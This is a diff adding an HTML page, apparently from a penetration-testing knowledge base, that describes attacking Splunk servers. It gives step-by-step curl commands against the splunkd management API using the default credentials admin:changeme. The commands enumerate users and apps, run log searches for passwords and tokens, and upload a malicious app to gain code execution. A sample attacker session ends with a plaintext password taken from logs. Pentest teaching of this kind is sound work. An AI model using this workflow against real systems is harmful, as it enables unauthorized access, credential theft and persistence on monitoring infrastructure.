@@ -1,0 +1,189 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Splunk Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>SIEM & Logging</strong> • Focus: <strong>Splunk Abuse & Remote Code Execution</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Splunk (TCP/8000 web, 8089 API, 9997 forwarder) is a SIEM/log management platform. 
+    Misconfigurations (like default credentials, exposed APIs, or unsafe app deployments) 
+    and vulnerabilities (e.g., RCE in Splunkd) allow attackers to gain privileged access. 
+    Once compromised, attackers can exfiltrate logs, discover credentials, or pivot into 
+    production systems. Splunk exploitation has been observed in red team operations and 
+    APT campaigns for persistence and lateral movement.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Default Credentials:</strong> <code>admin:changeme</code> often left enabled.</li>
+    <li><strong>Exposed Management API:</strong> <code>splunkd</code> API (8089) accessible without proper restrictions.</li>
+    <li><strong>App Upload Abuse:</strong> Malicious Splunk apps/plugins can lead to RCE.</li>
+    <li><strong>Search Processing Language (SPL):</strong> Misuse can expose sensitive data or enable code injection.</li>
+    <li><strong>SIEM Data:</strong> Splunk often stores logs with passwords, tokens, or system details.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify Splunk Web (8000) or API (8089).</li>
+    <li><strong>Authentication:</strong> Test default or weak credentials.</li>
+    <li><strong>Enumeration:</strong> Query Splunk API for users, apps, and logs.</li>
+    <li><strong>Exploitation:</strong> Upload malicious app, abuse SPL queries, or exploit Splunkd RCE.</li>
+    <li><strong>Impact:</strong> Access to logs, credential theft, RCE, persistence.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for Splunk services (8000, 8089, 9997).</li>
+    <li>Attempt login with <code>admin:changeme</code>.</li>
+    <li>Enumerate users and apps via API endpoints.</li>
+    <li>Search logs for passwords, API keys, or tokens.</li>
+    <li>Upload malicious Splunk app for RCE or exploit CVEs in Splunkd.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p8000,8089,9997 [target]
+curl -k https://[target]:8089/services/server/info -u admin:changeme
+
+# ------------------------------
+# Enumerate Users
+# ------------------------------
+curl -k -u admin:changeme https://[target]:8089/services/authentication/users
+
+# ------------------------------
+# Enumerate Apps
+# ------------------------------
+curl -k -u admin:changeme https://[target]:8089/services/apps/local
+
+# ------------------------------
+# Dump Logs (example SPL search)
+# ------------------------------
+curl -k -u admin:changeme \
+"https://[target]:8089/services/search/jobs/export" \
+-d search="search index=* password OR token"
+
+# ------------------------------
+# Upload Malicious App for RCE
+# ------------------------------
+curl -k -u admin:changeme -F "name=evilapp" \
+-F "filename=@evilapp.spl" \
+https://[target]:8089/services/apps/appinstall
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p8000,8089 192.168.1.240
+curl -k -u admin:changeme https://192.168.1.240:8089/services/server/info
+curl -k -u admin:changeme https://192.168.1.240:8089/services/search/jobs/export -d search="index=* passwd"
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p8000,8089 192.168.1.240
+PORT     STATE SERVICE
+8000/tcp open  http-alt
+8089/tcp open  splunkd
+
+[ saide ~ ]$ curl -k -u admin:changeme https://192.168.1.240:8089/services/server/info
+<?xml version="1.0" encoding="UTF-8"?>
+<entry>
+  <title>server-info</title>
+  <content>
+    <s:key name="version">8.2.5</s:key>
+    <s:key name="os_name">Linux</s:key>
+  </content>
+</entry>
+
+[ saide ~ ]$ curl -k -u admin:changeme https://192.168.1.240:8089/services/apps/local
+<feed>
+  <entry><title>search</title></entry>
+  <entry><title>launcher</title></entry>
+</feed>
+
+[ saide ~ ]$ curl -k -u admin:changeme \
+"https://192.168.1.240:8089/services/search/jobs/export" \
+-d search="search index=* password"
+
+{
+  "event": { "user":"alice", "password":"Summer2025!" }
+}
+
+[+] Extracted plaintext credentials from Splunk logs
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Splunk exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+8000/tcp open  Splunk Web
+8089/tcp open  Splunkd API
+
+# Weak Credentials
+admin : changeme
+
+# Exploitation
+Queried logs containing passwords and tokens
+Uploaded malicious app for persistence
+
+# Proof of Exploitation
+Extracted valid AD password from logs
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/8000-pentesting-splunk" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Splunk
+      </a>
+    </li>
+    <li>
+      <a href="https://www.splunk.com/en_us/security" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        Splunk Security Resources
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Weak creds → Query API/logs → Extract secrets → Upload malicious app → RCE/persistence.</li>
+  </ul>
+</section>
